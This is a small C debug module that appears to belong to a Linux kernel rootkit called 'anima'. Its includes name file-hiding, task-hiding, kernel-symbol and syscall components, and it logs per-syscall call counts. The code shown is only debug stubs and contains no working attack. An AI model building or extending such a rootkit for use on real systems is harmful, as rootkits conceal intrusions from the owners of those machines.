#include <anima/arch.h>
#include <anima/config.h>
#include <anima/debug.h>
#include <anima/hide_file.h>
#include <anima/hide_task.h>
#include <anima/ksyms.h>
#include <anima/syscalls.h>
#include <anima/vfs.h>

#ifdef DEBUG

#include <linux/kernel.h>

struct syscall_stat sys_stats[NR_SYSCALLS] = { {0} };

void debug_rk(void)
{
	arch_hw_breakpoint_debug();
	vfs_debug();
}

void debug_sys_stats(void)
{
	for (int i = 0; i < ARRAY_SIZE(sys_stats); i++) {
		if (sys_stats[i].nr_call)
			pr_debug("%s: sys_stats[%d].nr_call = %lu\n",
				 __func__, i, sys_stats[i].nr_call);
	}
}

#else

void __debug(const char *func, const char *fmt, ...)
{
}

void debug_rk(void)
{
}

void debug_sys_stats(void)
{
}

#endif
